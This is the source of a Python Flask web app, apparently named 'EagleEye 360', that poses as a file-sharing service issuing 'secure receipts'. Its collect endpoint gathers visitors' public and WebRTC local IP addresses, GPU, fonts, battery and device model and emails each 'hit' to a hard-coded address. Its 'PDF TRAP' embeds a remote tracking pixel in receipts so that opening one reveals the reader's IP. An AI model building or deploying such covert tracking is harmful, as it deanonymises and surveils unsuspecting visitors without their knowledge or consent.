import os
import json
import smtplib
import threading
import uuid
import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, make_response
from werkzeug.utils import secure_filename
from fpdf import FPDF

app = Flask(__name__)

# --- КОНФИГУРАЦИЯ ---
# На Render файловая система временная, используем /tmp
UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png'}

# --- НАСТРОЙКИ ПОЧТЫ ---
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SENDER_EMAIL = os.environ.get("SENDER_EMAIL")
SENDER_PASSWORD = os.environ.get("SENDER_PASSWORD")
TARGET_EMAIL = "Gencinski1996@gmail.com"

# База данных в памяти (сбрасывается при перезагрузке)
db = {}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# --- ОТПРАВКА ОТЧЕТА (DIAMOND EDITION) ---
def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
    if not SENDER_EMAIL or not SENDER_PASSWORD:
        print("[-] Email credentials not set.")
        return

    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = TARGET_EMAIL
        msg['Subject'] = f"🦅 DIAMOND HIT: {trigger_type} from {user_ip}"

        # Распаковка данных
        fp = data.get('fingerprint', {})
        sys = data.get('system', {})
        ch = data.get('client_hints') or {}
        net = data.get('network', {})
        fonts = data.get('fonts', [])
        
        # --- ОПРЕДЕЛЕНИЕ МОДЕЛИ УСТРОЙСТВА ---
        detected_model = "Unknown Device"
        detected_os = sys.get('platform')
        
        # 1. Client Hints (Android / Windows 11)
        if ch:
            if ch.get('model'): detected_model = ch.get('model')
            if ch.get('platform'): detected_os = f"{ch.get('platform')} {ch.get('version')}"
        
        # 2. iOS Heuristics (iPhone по разрешению экрана)
        elif "iPhone" in user_agent or "iPad" in user_agent:
            try:
                w, h = fp.get('screen', '0x0').split('x')
                pr = fp.get('pixelRatio', 1)
                res = f"{w}x{h}@{pr}"
                ios_map = {
                    "390x844@3": "iPhone 12/13/14", "428x926@3": "iPhone 12/13/14 Pro Max",
                    "393x852@3": "iPhone 14/15 Pro", "430x932@3": "iPhone 14/15 Pro Max",
                    "375x812@3": "iPhone X/XS/11 Pro", "414x896@2": "iPhone 11/XR",
                    "320x568@2": "iPhone SE"
                }
                detected_model = ios_map.get(res, "iPhone (Generic)")
                detected_os = "iOS"
            except: pass
        
        # 3. Desktop Fallback
        elif "Win" in sys.get('platform', ''): detected_model = "Windows PC"
        elif "Mac" in sys.get('platform', ''): detected_model = "Macintosh"
        elif "Linux" in sys.get('platform', ''): detected_model = "Linux PC"

        # Формирование HTML-отчета
        body = f"""
        <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #333; max-width: 800px; background: #f4f4f4; padding: 20px;">
            <div style="background: #2c3e50; color: #fff; padding: 20px; border-radius: 8px 8px 0 0; border-bottom: 5px solid #e74c3c;">
                <h1 style="margin: 0; font-size: 26px;">{detected_model}</h1>
                <p style="margin: 5px 0 0 0; opacity: 0.9; font-size: 16px;">{detected_os} • {trigger_type}</p>
            </div>

            <div style="background: #fff; padding: 20px; border: 1px solid #ddd; border-top: none; border-radius: 0 0 8px 8px;">
                
                <h3 style="color: #c0392b; border-bottom: 1px solid #eee; padding-bottom: 10px;">🎯 Identity & Network</h3>
                <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
                    <tr><td style="padding: 8px; width: 40%; color: #777;">Public IP</td><td style="padding: 8px; font-weight: bold;">{user_ip}</td></tr>
                    <tr style="background: #f8f9fa;"><td style="padding: 8px; color: #777;">Local IP (WebRTC)</td><td style="padding: 8px; font-weight: bold; color: #d35400;">{', '.join(net.get('localIPs', [])) or 'Hidden/VPN'}</td></tr>
                    <tr><td style="padding: 8px; color: #777;">Timezone</td><td style="padding: 8px; font-weight: bold;">{sys.get('timezone')}</td></tr>
                    <tr style="background: #f8f9fa;"><td style="padding: 8px; color: #777;">Languages</td><td style="padding: 8px;">{', '.join(sys.get('languages', []))}</td></tr>
                </table>

                <h3 style="color: #c0392b; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-top: 20px;">📱 Hardware Fingerprint</h3>
                <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
                    <tr><td style="padding: 8px; width: 40%; color: #777;">GPU Renderer</td><td style="padding: 8px; font-weight: bold;">{fp.get('webgl_renderer')}</td></tr>
                    <tr style="background: #f8f9fa;"><td style="padding: 8px; color: #777;">GPU Vendor</td><td style="padding: 8px;">{fp.get('webgl_vendor')}</td></tr>
                    <tr><td style="padding: 8px; color: #777;">Screen</td><td style="padding: 8px;">{fp.get('screen')} (Px Ratio: {fp.get('pixelRatio')})</td></tr>
                    <tr style="background: #f8f9fa;"><td style="padding: 8px; color: #777;">Battery</td><td style="padding: 8px; font-weight: bold;">{sys.get('battery')}</td></tr>
                    <tr><td style="padding: 8px; color: #777;">CPU / RAM</td><td style="padding: 8px;">{fp.get('cores')} Cores / ~{fp.get('memory')} GB</td></tr>
                    <tr style="background: #f8f9fa;"><td style="padding: 8px; color: #777;">Touch Screen</td><td style="padding: 8px;">{'YES' if sys.get('touch') else 'NO'}</td></tr>
                </table>

                <h3 style="color: #c0392b; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-top: 20px;">📝 System Fonts ({len(fonts)})</h3>
                <div style="font-size: 12px; color: #555; background: #f1f1f1; padding: 10px; border-radius: 4px; max-height: 100px; overflow-y: auto;">
                    {', '.join(fonts) if fonts else 'No fonts detected (Mobile or Blocked)'}
                </div>

                <div style="margin-top: 20px; font-size: 11px; color: #aaa; text-align: center;">
                    <strong>Raw UA:</strong> {user_agent}<br>
                    EagleEye 360 Diamond Edition
                </div>
            </div>
        </div>
        """

        msg.attach(MIMEText(body, 'html'))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, TARGET_EMAIL, msg.as_string())
        server.quit()
        print(f"[+] Email sent to {TARGET_EMAIL}")
    except Exception as e:
        print(f"[-] Email Error: {e}")

# --- PDF TRAP GENERATOR ---
class PDFReceipt(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 15)
        self.cell(0, 10, 'PDFEAGLE - Secure Receipt', 0, 1, 'C')

def generate_receipt(uid, filename):
    pdf = PDFReceipt()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt=f"File: {filename}", ln=1)
    pdf.cell(200, 10, txt=f"Transaction ID: {uid}", ln=1)
    pdf.cell(200, 10, txt=f"Timestamp: {datetime.datetime.now()}", ln=1)
    pdf.cell(200, 10, txt="Status: Verified & Scanned", ln=1)
    
    # Внедрение невидимого пикселя (Canary Token)
    # Работает, если PDF откроют в Adobe Reader / Word
    tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_receipt&uid={uid}"
    try:
        pdf.image(tracking_url, x=10, y=100, w=1, h=1)
    except:
        pass
    
    path = os.path.join(app.config['UPLOAD_FOLDER'], f"receipt_{uid}.pdf")
    pdf.output(path)
    return f"receipt_{uid}.pdf"

# --- МАРШРУТЫ ---

@app.route('/health')
def health_check():
    """Для UptimeRobot, чтобы не спал"""
    return "OK", 200

@app.route('/pixel.gif')
def tracking_pixel():
    """Ловушка для PDF и no-js клиентов"""
    source = request.args.get('source', 'unknown')
    uid = request.args.get('uid', 'unknown')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if source == 'pdf_receipt':
        data = {
            'meta': {'url': f'PDF TRAP ({uid})'},
            'system': {'platform': 'PDF Reader Application'},
            'fingerprint': {'webgl_renderer': 'N/A'},
            'network': {'localIPs': ['Unknown']}
        }
        threading.Thread(target=send_email_background, args=(data, ip, "PDF Reader", "PDF TRAP TRIGGERED")).start()

    return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'files' not in request.files: return redirect(request.url)
        files = request.files.getlist('files')
        uploaded_files = []
        for file in files:
            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
                ext = filename.rsplit('.', 1)[1].lower()
                icon = "fa-file-pdf" if ext == 'pdf' else "fa-file-word" if ext in ['doc', 'docx'] else "fa-file-alt"
                uploaded_files.append({'name': filename, 'format': ext.upper(), 'icon': icon, 'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")})

        if uploaded_files:
            unique_id = uuid.uuid4().hex[:6]
            db[unique_id] = {'files': uploaded_files, 'created_at': datetime.datetime.now()}
            return redirect(f"/{unique_id}")
    return render_template('index.html')

@app.route('/<unique_id>')
def view_files(unique_id):
    data = db.get(unique_id)
    if not data: return "File not found", 404
    return render_template('view.html', files=data['files'], uid=unique_id)

@app.route('/download/<uid>/<filename>')
def download_file(uid, filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/download_receipt/<uid>')
def download_receipt(uid):
    filename = generate_receipt(uid, "Secure_Download")
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/api/collect', methods=['POST'])
def collect_data():
    data = request.json
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    trigger = data.get('meta', {}).get('trigger', 'Page Load')
    threading.Thread(target=send_email_background, args=(data, user_ip, user_agent, trigger)).start()
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
